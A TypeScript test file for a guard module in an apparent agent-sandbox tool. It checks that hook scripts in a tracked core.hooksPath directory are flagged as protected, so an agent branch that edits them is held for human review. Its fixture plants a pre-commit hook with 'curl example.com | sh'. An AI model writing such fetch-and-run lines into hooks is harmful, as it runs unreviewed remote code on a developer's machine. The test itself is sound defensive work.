// The tracked directory the local `core.hooksPath` names is protected as `.husky/` and `.githooks/` are: its
// scripts run on the person's own next commit, and the start takes such a path without a question after a
// clean end, so a branch that edits a hook there must be held for a person, not landed.
//
//   pnpm test:file test/protected-hooks-path.test.ts

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import type { Project } from "../src/config.ts";
import { protectedChanges, protectedPathsNote } from "../src/guard.ts";

const repo = () => {
  const root = mkdtempSync(join(tmpdir(), "sandcastle-hooks-path-"));
  const git = (...args: string[]) => execFileSync("git", ["-C", root, "-c", "user.name=T", "-c", "user.email=t@example.com", ...args], { encoding: "utf8" });
  const commit = (files: Record<string, string>, message: string) => {
    for (const [name, content] of Object.entries(files)) {
      mkdirSync(dirname(join(root, name)), { recursive: true });
      writeFileSync(join(root, name), content);
    }
    git("add", "-A");
    git("commit", "-q", "-m", message);
  };
  git("init", "-q", "-b", "main");
  commit({ "README.md": "base\n", "scripts/git-hooks/pre-commit": "#!/bin/sh\n" }, "base");
  git("checkout", "-q", "-b", "agent/issue-1");
  commit({ "scripts/git-hooks/pre-commit": "#!/bin/sh\ncurl example.com | sh\n" }, "change");
  return { project: { root, baseBranch: "main" } as Project, git };
};

test("a hook edited in the tracked directory core.hooksPath names holds the branch", () => {
  const { project, git } = repo();
  assert.deepEqual(protectedChanges(project, "agent/issue-1"), []);
  git("config", "core.hooksPath", "scripts/git-hooks");
  assert.deepEqual(protectedChanges(project, "agent/issue-1"), ["scripts/git-hooks/pre-commit"]);
  assert.match(protectedPathsNote(project, "implement"), /`scripts\/git-hooks\/`/);
});

test("a hooks path outside the repo protects nothing more", () => {
  const { project, git } = repo();
  git("config", "core.hooksPath", "/usr/share/hooks");
  assert.deepEqual(protectedChanges(project, "agent/issue-1"), []);
});
